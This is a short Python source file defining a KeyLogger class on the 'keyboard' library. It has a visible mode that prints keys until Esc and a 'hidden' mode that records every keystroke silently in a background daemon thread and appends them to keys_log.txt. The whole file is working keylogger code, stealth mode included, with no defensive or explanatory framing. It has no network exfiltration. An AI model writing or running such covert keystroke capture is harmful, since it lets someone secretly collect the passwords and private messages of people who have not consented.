import keyboard
import os
import threading

class KeyLogger:
    def __init__(self, print_keys=False):
        """
        Initialize the KeyLogger.
        :param print_keys: If True, keys will be printed to the console (used for normal mode).
        """
        self.keys_pressed = []  # List to store keys pressed
        self.is_logging = False  # Flag to control logging
        self.log_thread = None   # Thread for hidden logging
        self.print_keys = print_keys  # Whether to print keys (used in normal mode)

    def on_key_press(self, event):
        """Callback for every key press event."""
        self.keys_pressed.append(event.name)  # Add the key name to the list
        if self.print_keys:
            print(f"Key pressed: {event.name}")  # Only print keys if allowed

    def start_logging(self):
        """Start the key logging (normal mode)."""
        if not self.is_logging:
            self.is_logging = True  # Mark that logging is in progress
            self.print_keys = True  # Enable printing of keys for normal mode
            keyboard.on_press(self.on_key_press)  # Start listening for key presses
            print("Key logging started. Press 'esc' to stop (normal mode).")

            # In normal mode, block until 'esc' is pressed
            keyboard.wait('esc')
            self.stop_logging()  # Stop logging after 'esc' is pressed

    def start_hidden_logging(self):
        """Start logging in hidden mode (background thread)."""
        if not self.is_logging:
            self.is_logging = True
            self.print_keys = False  # Disable printing of keys for hidden mode
            self.log_thread = threading.Thread(target=self._hidden_logging_loop)
            self.log_thread.daemon = True  # Run in the background as a daemon
            self.log_thread.start()
            print("Hidden key logging started.")

    def _hidden_logging_loop(self):
        """Background logging loop for hidden mode."""
        keyboard.on_press(self.on_key_press)  # Start listening for key presses
        while self.is_logging:  # Keep logging while the flag is True
            # No need to block, just passively log keys in the background
            pass

    def stop_logging(self):
        """Stop the key logging and save the log to a file."""
        if self.is_logging:
            self.is_logging = False  # Stop the logging process
            keyboard.unhook_all()  # Unhook all keyboard listeners
            self._save_to_file()  # Save the logged keys to a file
            print("Key logging stopped and saved to file.")

    def _save_to_file(self):
        """Save the logged keys to a text file."""
        log_file_path = os.path.join(os.getcwd(), "keys_log.txt")  # Get the full path
        try:
            with open(log_file_path, "a") as f:
                f.write(" ".join(self.keys_pressed) + "\n")  # Append the logged keys
                f.flush()  # Ensure the data is written to disk immediately
            print(f"Keys saved to {log_file_path}")
        except Exception as e:
            print(f"Error saving to file: {e}")
